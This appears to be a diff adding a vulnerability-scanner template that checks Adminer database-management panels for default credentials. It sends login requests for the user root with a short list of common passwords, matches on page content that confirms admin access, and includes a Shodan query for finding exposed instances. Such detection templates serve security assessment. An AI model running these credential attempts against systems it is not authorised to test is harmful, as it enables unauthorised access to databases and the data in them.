@@ -1,0 +1,64 @@
+id: adminer-default-login
+
+info:
+  name: Adminer Default Login - Detect
+  author: j4vaovo
+  severity: high
+  description: |
+    Adminer contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
+  reference:
+    - https://www.adminer.org
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    verified: true
+    max-request: 5
+    shodan-query: http.title:adminer
+  tags: default-login,adminer
+
+http:
+  - raw:
+      - |
+        POST /index.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        auth[driver]=server&auth[server]=&auth[username]={{username}}&auth[password]={{password}}&auth[db]=
+
+    attack: clusterbomb
+    payloads:
+      username:
+        - root
+      password:
+        - root
+        - toor
+        - 123
+        - 123456
+        - 123456789
+    host-redirects: true
+    max-redirects: 1
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Create database'
+          - 'Privileges'
+          - 'Process list'
+          - 'Adminer'
+        condition: and
+        case-insensitive: true
+
+      - type: word
+        part: header
+        words:
+          - 'text/html'
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a0047304502201123cb1b865bf824dc8156a81b3423e30d09c6ad8021c3a5fc0a26edc6047a76022100ee43b6ad4796e27cbf84cba1152577f066a78a8d192faba2634c5ea6ff076497:922c64590222798bb761d5b6d8e72950
